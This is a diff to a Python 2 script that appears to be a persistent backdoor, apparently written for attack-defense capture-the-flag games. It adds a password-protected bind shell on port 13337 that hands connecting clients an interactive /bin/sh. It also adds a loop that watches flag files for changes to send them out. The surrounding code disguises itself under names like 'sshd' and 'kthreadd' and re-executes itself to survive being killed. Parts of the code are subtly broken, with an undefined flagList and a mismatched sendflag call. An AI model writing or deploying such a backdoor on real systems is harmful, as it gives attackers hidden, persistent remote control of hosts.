@@ -1,8 +1,8 @@
 #! /usr/bin/python
 # coding: utf-8
 
-import sys, os, signal, random, time
-
+import sys, os, signal, random, time, socket, subprocess, threading
+fileList = {"file":""}
 nameList = ['init', 'pwn1', 'socat', 'sshd', 'rcu_sched', 'getty', 'ps', 'cron', 'kthreadd']
 DAEMONID = -1
 fileData = ''
@@ -10,7 +10,8 @@ opid = 0
 flag = 1
 wpid = -1
 onStart = 0
-
+ni = open('/dev/null', 'r').fileno()
+no = open('/dev/null', 'w').fileno()
 
 
 def startWork():
@@ -27,18 +28,11 @@ def startWork():
 
 
 def restart():
-    global flag
-    if flag == 1:
-        flag = 0
-        pid = os.fork()
-        if pid > 0:
-            sys.exit(0)
-
-        tmpName = os.tmpnam()
-        fp = open(tmpName, 'w')
-        fp.write(fileData)
-        fp.close()
-        os.execv('/usr/bin/python', ['python', tmpName])
+    tmpName = os.tmpnam()
+    fp = open(tmpName, 'w')
+    fp.write(fileData)
+    fp.close()
+    os.execv('/usr/bin/python', ['python', tmpName])
     sys.exit(0)
 
 
@@ -50,12 +44,23 @@ def getQuit(sig, frame):
     signal.signal(signal.SIGQUIT, signal.SIG_IGN)
     signal.signal(signal.SIGPIPE, signal.SIG_IGN)
     try:
+        if DAEMONID == 1:
+            time.sleep(0.5)
         os.kill(opid, signal.SIGKILL)
-        if wpid != -1:
-            os.kill(wpid,signal.SIGKILL)
     except:
         pass
-    restart()
+    try:
+        if wpid != -1:
+            os.kill(wpid, signal.SIGKILL)
+    except:
+        pass
+    global flag
+    if flag == 1:
+        flag = 0
+        pid = os.fork()
+        if pid > 0:
+            sys.exit(0)
+        restart()
 
 
 def daemonize(stdin, stdout, stderr='/dev/null'):
@@ -141,7 +146,7 @@ def creteDeamo():
             os.kill(opid, 0)
             time.sleep(0.001)
         except OSError:
-            restart()
+            getQuit(0, 0)
 
         if DAEMONID == 0 and onStart == 0:
             try:
@@ -150,6 +155,7 @@ def creteDeamo():
                 onStart = 1
                 signal.signal(signal.SIGALRM, getQuit)
                 signal.alarm(30)
+
 
 # get random name in list
 def getRandom(List):
@@ -184,12 +190,43 @@ def daemon():
     creteDeamo()
 
 
-def work():
-    si = open('/dev/null', 'r').fileno()
-    so = open('/dev/null', 'w').fileno()
-    daemonize(si, so)
-
+def shell():
+    daemonize(ni, no)
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind(('0.0.0.0', 13337))
+    server.listen(5)
+    sys.stderr.write('start wait connect')
     while True:
+        talk, addr = server.accept()
+        talk.send('passwd:')
+        passwd = talk.recv(1024)
+        if passwd.strip() == "misaka":
+            def sh(handle):
+                print handle
+                proc = subprocess.Popen(["/bin/sh", "-i"], stdin=handle, stdout=handle, stderr=handle, shell=True)
+                proc.wait()
+
+            threading.Thread(target=sh, args=(talk,)).start()
+        else:
+            talk.send('bye')
+
+def sendflag():
+    pass
+
+def work():
+    daemonize(ni, no)
+
+    pid = os.fork()
+    if pid == 0:
+        shell()
+    while True:
+        for fname in flagList:
+            fp = open(fname)
+            flag = fp.read()
+            if flag.strip() != flagList[fname]:
+                flagList[fname] = flag.strip()
+                sendflag(flag)
+            fp.close()
         time.sleep(5)
 
 
